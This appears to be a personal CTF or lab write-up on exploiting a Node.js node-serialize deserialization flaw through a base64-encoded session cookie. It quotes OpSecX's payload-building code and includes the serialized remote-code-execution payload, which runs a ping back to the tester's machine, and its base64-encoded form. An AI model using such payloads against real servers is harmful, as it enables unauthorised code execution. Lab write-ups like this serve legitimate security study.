When i enter an email it gives me a cookie. That cookie looked like base64 so i put it into cyberchef:

![[Pasted image 20240719130706.png]]

I add in a string message and update the session cookie value:

![[Pasted image 20240719132255.png]]

![[Pasted image 20240719132312.png]]

It gets reflected back.

- blog post by OpSecX on exploiting Node.js deserialization: [https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)

![[Pasted image 20240719132506.png]]

#### **Building the Payload**
- by OpSecX

I have used node-serialize version 0.0.4 for this research. For successful exploitation, arbitrary code execution should occur when untrusted input is passed into `unserialize()` function. The best way to create a payload is to use the `serialize()` function of the same module.

I created the following JavaScript object and passed it to `serialize()` function.
```js
var y = {
 rce : function(){
 require('child_process').exec('ping -c <IP>', function(error, stdout, stderr) { console.log(stdout) });
 },
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```

Install required modules
```php
sudo apt install nodejs
```

```php
sudo apt install npm
```

```php
npm install node-serialize
```

Serialize object
```php
node serial.js
```

That gives me an output similar to the email format i found earlier. I can then encode it to base64 and try it against the website.

```php
Serialized: 
{"rce":"_$$ND_FUNC$$_function(){\n require('child_process').exec('ping -c 10.9.0.241', function(error, stdout, stderr) { console.log(stdout) });\n }"}
```

Waiting for a ping back to our machine.
```php
sudo tcpdump -i tun0 icmp
```

I can now test the website and possibly get a reverse shell.

```php
eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24oKXtcbiByZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygncGluZyAtYyAxMC45LjAuMjQxJywgZnVuY3Rpb24oZXJyb3IsIHN0ZG91dCwgc3RkZXJyKSB7IGNvbnNvbGUubG9nKHN0ZG91dCkgfSk7XG4gfSJ9
```

